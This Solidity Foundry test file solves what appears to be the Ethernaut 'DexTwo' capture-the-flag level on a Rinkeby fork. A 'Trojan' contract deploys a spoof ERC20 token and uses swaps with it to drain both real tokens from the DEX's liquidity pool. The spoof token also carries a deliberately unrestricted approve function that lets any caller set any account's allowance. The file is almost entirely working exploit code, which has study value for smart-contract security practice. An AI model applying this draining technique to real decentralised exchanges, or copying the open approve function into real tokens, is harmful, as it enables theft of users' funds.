// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/access/Ownable.sol';
import '../src/DexTwo.sol';
import 'forge-std/Test.sol';

contract DexTwoTest is Test {
    uint256 rinkebyFork;
    string RINKEBY_RPC_URL = vm.envString("RINKEBY_RPC_URL");

    function setUp() public {
        rinkebyFork = vm.createFork(RINKEBY_RPC_URL);
    }

    function testCreateTrojan() public {
        vm.selectFork(rinkebyFork);
        assertEq(vm.activeFork(), rinkebyFork);

        Trojan trojan = new Trojan(0xEBdD1589eE74fe7007303Fad62247826b537dC88);
        trojan.inject();

        uint tokenBalance1 = trojan.checkBalance1();
        uint tokenBalance2 = trojan.checkBalance2();
        assertTrue(tokenBalance1 == 0 && tokenBalance2 == 0);
    }
}

contract Trojan {

    address public token1;
    address public token2;
    address private hacker;
    SpoofToken spoofToken;
    DexTwo dexTwo;

    constructor(address $your_ethernaut_instance_here) {
        dexTwo = DexTwo($your_ethernaut_instance_here);
        token1 = dexTwo.token1();
        token2 = dexTwo.token2();
        spoofToken = new SpoofToken($your_ethernaut_instance_here, 'Spoof', 'SPF');
        hacker = msg.sender;
    }

    function inject() public {
        uint amount = 100;
        // set allowance for dex in from to msg.sender
        spoofToken.approve(address(this), address(dexTwo), amount * 3);

        // call swap using our spooftoken to drain all token1s out of dex2's liquidity pool 
        dexTwo.swap(address(spoofToken), token1, amount);
        // call swap again using spooftoken to drain all token2s out of dex2's liquidity pool
        // keep in mind that balanceOf(spoofToken, dexTwo) is now 200!!! Since 100 were minted and then 100 exchanged for token1
        dexTwo.swap(address(spoofToken), token2, amount * 2);
    }

    // in case you want to check the damage we've done to dexTwo :) *also testing
    function checkBalance1() public view returns (uint) {
        return dexTwo.balanceOf(token1, address(dexTwo));
    }

    function checkBalance2() public view returns (uint) {
        return dexTwo.balanceOf(token2, address(dexTwo));
    }
}

contract SpoofToken is ERC20 {

    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol) ERC20(name,symbol) {
        _dex = dexInstance;
        _mint(msg.sender, 300);
        _mint(_dex, 100);
    }

    function approve(address owner, address spender, uint256 amount) public {
        super._approve(owner, spender, amount);
    }
}